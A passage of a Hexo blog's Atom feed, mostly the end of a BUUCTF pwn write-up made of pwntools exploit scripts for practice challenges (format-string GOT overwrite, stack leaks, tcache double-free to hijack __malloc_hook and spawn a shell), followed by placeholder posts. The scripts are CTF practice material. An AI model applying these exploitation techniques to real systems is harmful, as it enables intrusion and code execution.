class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sla(<span class="string">&#x27;Read location?\n&#x27;</span>, puts_got)</span><br><span class="line">ru(<span class="string">&#x27;0x0000&#x27;</span>)</span><br><span class="line">puts = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span>+p.recv(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-102-echo-solve"><a href="#NO-102-echo-solve" class="headerlink" title="NO.102 echo_solve"></a>NO.102 echo_solve</h1><h3 id="exp-102"><a href="#exp-102" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./echo&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26786</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./echo&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">7</span></span><br><span class="line">printf_addr = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&quot;printf_addr&quot;</span>, printf_addr)</span><br><span class="line">lg(<span class="string">&quot;system&quot;</span>, system_addr)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(offset, &#123;printf_addr:system_addr&#125;)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-103-wustctf2020-name-your-cat-solve"><a href="#NO-103-wustctf2020-name-your-cat-solve" class="headerlink" title="NO.103 wustctf2020_name_your_cat_solve"></a>NO.103 wustctf2020_name_your_cat_solve</h1><h3 id="exp-103"><a href="#exp-103" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./wustctf2020_name_your_cat&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27792</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;wustctf2020_name_your_cat&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x080485CB</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sla(&#x27;&gt;&#x27;, &#x27;7&#x27;)</span></span><br><span class="line"><span class="comment"># sla(&#x27;: &#x27;, p32(shell))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">sla(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;: &#x27;</span>, p32(shell))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-104-wdb2018-guess-solve"><a href="#NO-104-wdb2018-guess-solve" class="headerlink" title="NO.104 wdb2018_guess_solve"></a>NO.104 wdb2018_guess_solve</h1><h3 id="exp-104"><a href="#exp-104" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./wdb2018_guess&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25094</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;wdb2018_guess&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_addr</span>(<span class="params">addr, name, get_addr_name, mode=<span class="number">1</span></span>):</span></span><br><span class="line"><span class="keyword">if</span> mode:</span><br><span class="line"><span class="keyword">return</span> addr-libc.sym[name]+libc.sym[get_addr_name]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> addr-libc.dump(name)+libc.dump(get_addr_name)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(read_got)</span><br><span class="line">sla(<span class="string">&#x27;flag\n&#x27;</span>, payload)</span><br><span class="line">read_addr = l64()</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">system = get_addr(read_addr,<span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">environ = get_addr(read_addr, <span class="string">&#x27;read&#x27;</span>, <span class="string">&#x27;_environ&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;read&#x27;</span>, read_addr)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;__environ&#x27;</span>, environ)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(environ)</span><br><span class="line">sla(<span class="string">&#x27;flag\n&#x27;</span>, payload)</span><br><span class="line">flag_addr = l64() - <span class="number">0x168</span></span><br><span class="line">lg(<span class="string">&#x27;flag_addr&#x27;</span>, flag_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x128</span> + p64(flag_addr)</span><br><span class="line">sla(<span class="string">&#x27;flag\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-105-ciscn-2019-final-3-solve"><a href="#NO-105-ciscn-2019-final-3-solve" class="headerlink" title="NO.105 ciscn_2019_final_3_solve"></a>NO.105 ciscn_2019_final_3_solve</h1><h3 id="exp-105"><a href="#exp-105" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;node3.buuoj.cn&#x27;,28589)</span></span><br><span class="line">io=process(<span class="string">&#x27;ciscn_2019_final_3&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice &gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;the index&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;the size&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;something&#x27;</span>)</span><br><span class="line">    io.sendline(data)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;gift :&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(io.recvline()[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;choice &gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;the index&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))   </span><br><span class="line"></span><br><span class="line">heap=add(<span class="number">0</span>,<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#3 </span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#5 </span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#7 </span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#9 </span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x78</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x78</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x28</span>,<span class="string">&#x27;d&#x27;</span>)<span class="comment">#12</span></span><br><span class="line"><span class="comment">#dup </span></span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))<span class="comment">#4 修改为chunk0 size的地址</span></span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x28</span>,p64(heap-<span class="number">0x10</span>))<span class="comment">#5</span></span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x421</span>))<span class="comment">#get chunk0-&gt;size，size需要超过0x400才能进unsortbin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overlap</span></span><br><span class="line">free(<span class="number">0</span>) <span class="comment">#unsort_bin chunk0-&gt;fd=libc</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#tcache</span></span><br><span class="line">add(<span class="number">16</span>,<span class="number">0x78</span>,<span class="string">&#x27;e&#x27;</span>)<span class="comment">#7  从unsortbin分下一块,后面依然在unsortbin里 chunk1-&gt;fd=libc</span></span><br><span class="line">add(<span class="number">17</span>,<span class="number">0x18</span>,<span class="string">&#x27;f&#x27;</span>)<span class="comment">#8  get chunk1</span></span><br><span class="line">libc_base=add(<span class="number">18</span>,<span class="number">0x18</span>,<span class="string">&#x27;g&#x27;</span>)-<span class="number">0x3ebca0</span><span class="comment">#9   get libc</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x10a38c</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base),<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment">#dup</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">19</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">20</span>,<span class="number">0x78</span>,p64(malloc_hook))</span><br><span class="line">add(<span class="number">21</span>,<span class="number">0x78</span>,p64(one_gadget))</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;22&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;0;cat flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">BUUCTF-PWN WP To be continued .....</summary>
    
    
    
    <category term="CTF" scheme="https://adam-01.github.io/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://adam-01.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="https://adam-01.github.io/2019/11/13/1/"/>
    <id>https://adam-01.github.io/2019/11/13/1/</id>
    <published>2019-11-13T07:01:09.000Z</published>
    <updated>2021-10-16T15:10:06.864Z</updated>
    
    
    
    
    
    <category term="test" scheme="https://adam-01.github.io/tags/test/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://adam-01.github.io/2019/11/13/hello-world/"/>
    <id>https://adam-01.github.io/2019/11/13/hello-world/</id>
    <published>2019-11-13T06:49:34.047Z</published>
    <updated>2019-11-14T05:40:40.061Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;doc</summary>
      
    
    
    
    
  </entry>
  
</feed>
